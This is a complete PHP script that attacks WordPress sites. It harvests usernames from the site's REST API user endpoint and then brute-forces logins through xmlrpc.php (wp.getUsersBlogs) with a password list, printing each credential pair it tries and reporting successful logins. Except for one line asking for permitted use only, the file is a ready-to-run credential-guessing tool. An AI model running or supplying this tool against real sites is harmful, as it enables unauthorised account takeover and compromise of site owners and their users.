<?php
/**
 * XML-RPC Brute Force Tool with Username Fetch from WordPress REST API
 *
 * Usage:
 *   php xmlrpc_bruteforce_with_user_fetch.php --url=https://target.com --passwords=passwords.txt [--delay=0.5] [--stop-on-success]
 *
 * Requirements:
 *   - PHP 7.2+
 *   - php-curl extension enabled
 *
 * Description:
 *   This script fetches usernames from the WordPress REST API endpoint /wp-json/wp/v2/users,
 *   then brute forces the XML-RPC login (wp.getUsersBlogs) for each username using passwords from the specified file.
 *
 * IMPORTANT:
 *   Use this tool responsibly and only against systems you have explicit permission to test.
 */

$options = getopt('', ['url:', 'passwords:', 'delay::', 'stop-on-success']);
if (!isset($options['url']) || !isset($options['passwords'])) {
    echo "Usage: php xmlrpc_bruteforce_with_user_fetch.php --url=https://target.com --passwords=passwords.txt [--delay=0.5] [--stop-on-success]\n";
    exit(1);
}

$baseUrl = rtrim($options['url'], '/');
$passwordFile = $options['passwords'];
$delay = isset($options['delay']) ? floatval($options['delay']) : 0.5;
$stopOnSuccess = isset($options['stop-on-success']);

if (!file_exists($passwordFile)) {
    echo "[!] Password file '{$passwordFile}' not found.\n";
    exit(1);
}

function fetchUsernames(string $baseUrl): array {
    $usernames = [];
    $page = 1;
    $perPage = 100;
    while (true) {
        $url = "{$baseUrl}/wp-json/wp/v2/users?per_page={$perPage}&page={$page}";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode !== 200 || !$response) {
            echo "[!] Failed to fetch users or no more users.\n";
            break;
        }

        $data = json_decode($response, true);
        if (!is_array($data) || count($data) === 0) {
            break;
        }

        foreach ($data as $user) {
            if (isset($user['slug'])) {
                $usernames[] = $user['slug'];
            }
        }

        if (count($data) < $perPage) {
            break;
        }

        $page++;
    }
    return $usernames;
}

function buildXmlRpcRequest(string $username, string $password): string {
    return <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{$username}</string></value></param>
    <param><value><string>{$password}</string></value></param>
  </params>
</methodCall>
XML;
}

function tryLogin(string $xmlrpcUrl, string $username, string $password): bool {
    $xml = buildXmlRpcRequest($username, $password);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $xmlrpcUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/xml']);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode !== 200 || !$response) {
        return false;
    }
    // If response contains <faultCode>, login failed
    if (strpos($response, '<faultCode>') !== false) {
        return false;
    }
    return true;
}

// Main execution
$passwords = file($passwordFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if (!$passwords) {
    echo "[!] No passwords loaded from file.\n";
    exit(1);
}

echo "[+] Fetching usernames from {$baseUrl}/wp-json/wp/v2/users ...\n";
$usernames = fetchUsernames($baseUrl);
if (count($usernames) === 0) {
    echo "[!] No usernames found. Exiting.\n";
    exit(1);
}
echo "[+] Found " . count($usernames) . " usernames: " . implode(', ', $usernames) . "\n";

$xmlrpcUrl = $baseUrl . '/xmlrpc.php';

$successCount = 0;
foreach ($usernames as $username) {
    foreach ($passwords as $password) {
        echo "[*] Trying {$username}:{$password} ... ";
        $success = tryLogin($xmlrpcUrl, $username, $password);
        if ($success) {
            echo "SUCCESS\n";
            $successCount++;
            if ($stopOnSuccess) {
                echo "[+] Stopping on first success as requested.\n";
                exit(0);
            }
        } else {
            echo "Failed\n";
        }
        usleep((int)($delay * 1_000_000));
    }
}

echo "[+] Finished. Successful logins: {$successCount}\n";
?>

